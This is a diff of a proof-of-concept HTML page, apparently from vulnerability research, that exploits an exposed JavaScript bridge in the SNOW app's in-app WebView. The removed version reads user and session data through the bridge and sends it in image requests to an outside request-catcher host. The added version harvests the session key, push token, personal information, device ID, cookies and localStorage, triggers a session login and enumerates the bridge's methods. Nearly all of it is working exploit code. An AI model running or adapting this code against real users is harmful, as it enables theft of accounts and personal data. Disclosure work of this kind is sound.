@@ -1,39 +1,251 @@
- <!DOCTYPE html>
-  <html>
-  <head><title>X</title><meta charset="utf-8"></head>
-  <body style="background:#000;color:#0f0;font:10px monospace;padding:10px">
-  <pre id="s">Loading...</pre>
-  <script>
-  var B = window.B612KajiBridgeInterface;
-  var s = document.getElementById('s');
-  var ATTACKER = 'https://snowpoc.requestcatcher.com/';
 
-  if (B) {
-      s.textContent = 'Bridge OK\n\n';
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: #0d1117;
+  color: #e6edf3;
+  font-family: 'Courier New', monospace;
+  font-size: 12px;
+  padding: 12px;
+  word-break: break-all;
+}
+.header {
+  background: #161b22;
+  border: 1px solid #30363d;
+  border-radius: 6px;
+  padding: 10px 14px;
+  margin-bottom: 12px;
+}
+.header h1 { font-size: 14px; color: #f85149; font-weight: bold; }
+.header p  { font-size: 11px; color: #8b949e; margin-top: 4px; }
+.card {
+  background: #161b22;
+  border: 1px solid #30363d;
+  border-radius: 6px;
+  margin-bottom: 10px;
+  overflow: hidden;
+}
+.card-title {
+  background: #21262d;
+  padding: 6px 12px;
+  font-size: 11px;
+  font-weight: bold;
+  color: #58a6ff;
+  border-bottom: 1px solid #30363d;
+}
+.card-title.ok   { color: #3fb950; }
+.card-title.err  { color: #f85149; }
+.card-title.warn { color: #e3b341; }
+.field {
+  padding: 6px 12px;
+  border-bottom: 1px solid #21262d;
+  display: flex;
+  gap: 8px;
+}
+.field:last-child { border-bottom: none; }
+.field-key   { color: #e3b341; min-width: 120px; flex-shrink: 0; }
+.field-val   { color: #79c0ff; flex: 1; word-break: break-all; }
+.field-val.sensitive { color: #f85149; font-weight: bold; }
+.field-val.ok       { color: #3fb950; }
+.field-val.empty    { color: #484f58; font-style: italic; }
+#status {
+  text-align: center;
+  padding: 20px;
+  color: #8b949e;
+  font-size: 13px;
+}
+</style>
+</head>
+<body>
 
-      window.cb = function(d) {
-          var x = typeof d === 'string' ? JSON.parse(d) : d;
-          s.textContent += '=== USER DATA STOLEN ===\n';
-          s.textContent += JSON.stringify(x, null, 2) + '\n\n';
-          var img = new Image();
-          img.src = ATTACKER + 'userdata?d=' + encodeURIComponent(JSON.stringify(x));
-          s.textContent += 'EXFILTRATED!\n';
-      };
+<div class="header">
+  <h1>⚠ VULN-002: B612KajiBridgeInterface — PoC</h1>
+  <p>com.campmobile.snow / InAppWebViewActivity / JS Bridge 72 methods</p>
+</div>
 
-      B.apiRequest('cb', JSON.stringify({
-          url: 'https://user-snow-api.snow.me/v1/user/me',
-          method: 'POST'
-      }));
+<div id="status">Bridge 탐색 중...</div>
+<div id="results"></div>
 
-      window.cb2 = function(d) {
-          var x = typeof d === 'string' ? JSON.parse(d) : d;
-          var img = new Image();
-          img.src = ATTACKER + 'session?d=' + encodeURIComponent(JSON.stringify(x));
-      };
-      B.getUserSession('cb2');
-  } else {
-      s.textContent = 'No Bridge';
+<script>
+var results = document.getElementById('results');
+var status  = document.getElementById('status');
+
+/* ── 유틸 ── */
+function card(title, cls, fields) {
+  var div = document.createElement('div');
+  div.className = 'card';
+  var h = document.createElement('div');
+  h.className = 'card-title ' + (cls||'');
+  h.textContent = title;
+  div.appendChild(h);
+  fields.forEach(function(f) {
+    var row = document.createElement('div');
+    row.className = 'field';
+    var k = document.createElement('span');
+    k.className = 'field-key';
+    k.textContent = f[0];
+    var v = document.createElement('span');
+    v.className = 'field-val ' + (f[2]||'');
+    v.textContent = f[1] == null ? '(null)' : (f[1] === '' ? '(empty)' : String(f[1]));
+    if (!f[1]) v.className += ' empty';
+    row.appendChild(k);
+    row.appendChild(v);
+    div.appendChild(row);
+  });
+  results.appendChild(div);
+}
+
+function parseJSON(s) {
+  try { return JSON.parse(s); } catch(e) { return null; }
+}
+
+/* ── 메인 ── */
+(function run() {
+
+  /* 1. Bridge 탐색 */
+  var BRIDGE_NAMES = [
+    'B612KajiBridgeInterface',
+    'AndroidBridge',
+    'snowBridge',
+    'kajiBridge'
+  ];
+  var bridge = null, bridgeName = null;
+  BRIDGE_NAMES.forEach(function(n) {
+    if (!bridge && typeof window[n] !== 'undefined') {
+      bridge = window[n]; bridgeName = n;
+    }
+  });
+
+  if (!bridge) {
+    status.style.color = '#f85149';
+    status.textContent = '✗ Bridge NOT FOUND — SNOW WebView 컨텍스트가 아닙니다.';
+    card('환경 정보', 'err', [
+      ['URL', location.href],
+      ['UserAgent', navigator.userAgent],
+      ['Bridge 탐색', BRIDGE_NAMES.join(', ')]
+    ]);
+    return;
   }
-  </script>
-  </body>
-  </html>
+
+  status.style.display = 'none';
+
+  /* 2. Bridge 발견 */
+  card('Bridge 발견', 'ok', [
+    ['이름', bridgeName, 'sensitive'],
+    ['URL', location.href],
+    ['origin', location.origin]
+  ]);
+
+  /* 3. getUserSession() */
+  try {
+    var sessionRaw = bridge.getUserSession();
+    var s = parseJSON(sessionRaw) || {};
+    card('getUserSession()', 'ok', [
+      ['userId',          s.userId         || sessionRaw, s.userId ? 'sensitive' : ''],
+      ['userOid',         s.userOid        || '', 'sensitive'],
+      ['name',            s.name           || '(없음)'],
+      ['isVIP',           String(s.isVIP)],
+      ['isCreator',       String(s.isCreator)],
+      ['availableReward', s.availableReward != null ? String(s.availableReward) : '', 'sensitive'],
+      ['totalCoin',       s.totalCoin      || '0'],
+      ['sessionKey',      s.sessionKey     ? s.sessionKey.substring(0,60)+'...' : '', 'sensitive'],
+      ['xColor',          s.xColor         ? s.xColor.substring(0,60)+'...'    : '', 'sensitive'],
+      ['pushToken',       s.pushToken      ? s.pushToken.substring(0,60)+'...' : '', 'sensitive'],
+      ['profileImageUrl', s.profileImageUrl|| ''],
+      ['userBadgeLevel',  s.userBadgeLevel || ''],
+    ]);
+  } catch(e) {
+    card('getUserSession()', 'err', [['오류', String(e)]]);
+  }
+
+  /* 4. getPersonalInfo() */
+  try {
+    var piiRaw = bridge.getPersonalInfo();
+    var p = parseJSON(piiRaw) || {};
+    var fields = [];
+    if (piiRaw && piiRaw !== 'null' && piiRaw !== '{}') {
+      Object.keys(p).forEach(function(k) {
+        fields.push([k, String(p[k]), 'sensitive']);
+      });
+      if (!fields.length) fields.push(['raw', piiRaw, 'sensitive']);
+    } else {
+      fields.push(['결과', piiRaw || '(empty)', 'empty']);
+    }
+    card('getPersonalInfo()', fields.some(function(f){return f[2]==='sensitive';}) ? 'ok warn' : 'warn', fields);
+  } catch(e) {
+    card('getPersonalInfo()', 'err', [['오류', String(e)]]);
+  }
+
+  /* 5. appInfo() */
+  try {
+    var ai = bridge.appInfo();
+    var a  = parseJSON(ai) || {};
+    card('appInfo()', '', [
+      ['appVersion',  a.appVersion  || ai || ''],
+      ['osVersion',   a.osVersion   || ''],
+      ['deviceModel', a.deviceModel || ''],
+      ['deviceId',    a.deviceId    || '', 'sensitive'],
+      ['locale',      a.locale      || ''],
+    ]);
+  } catch(e) {
+    card('appInfo()', 'err', [['오류', String(e)]]);
+  }
+
+  /* 6. Cookie / Storage */
+  var lsData = {};
+  try {
+    for (var i = 0; i < localStorage.length; i++) {
+      var k = localStorage.key(i);
+      lsData[k] = localStorage.getItem(k);
+    }
+  } catch(e) {}
+
+  card('Web Storage', document.cookie ? 'warn' : '', [
+    ['document.cookie', document.cookie || '(empty)', document.cookie ? 'sensitive' : 'empty'],
+    ['localStorage',    Object.keys(lsData).length ? JSON.stringify(lsData) : '(empty)',
+                        Object.keys(lsData).length ? 'sensitive' : 'empty'],
+  ]);
+
+  /* 7. loginWithSession() — 쿠키 갱신 후 재수집 */
+  try {
+    bridge.loginWithSession(function(loginResult) {
+      card('loginWithSession() 콜백', 'ok', [
+        ['결과',         String(loginResult)],
+        ['cookie after', document.cookie || '(empty)', document.cookie ? 'sensitive' : 'empty'],
+      ]);
+
+      /* 8. 로그인 후 추가 메서드 시도 */
+      ['getSubscriptionPath','getCreditshopPath','getABTestInfo'].forEach(function(m) {
+        try {
+          var v = bridge[m]();
+          if (v) card(m+'()', 'warn', [['결과', String(v)]]);
+        } catch(e) {}
+      });
+    });
+  } catch(e) {
+    card('loginWithSession()', 'err', [['오류', String(e)]]);
+  }
+
+  /* 9. 전체 메서드 목록 */
+  try {
+    var methods = [];
+    for (var key in bridge) {
+      if (typeof bridge[key] === 'function') methods.push(key);
+    }
+    if (methods.length) {
+      card('노출된 메서드 목록 ('+methods.length+'개)', 'warn',
+        methods.map(function(m){ return [m, 'function']; })
+      );
+    }
+  } catch(e) {}
+
+})();
+</script>
+</body>
+</html>
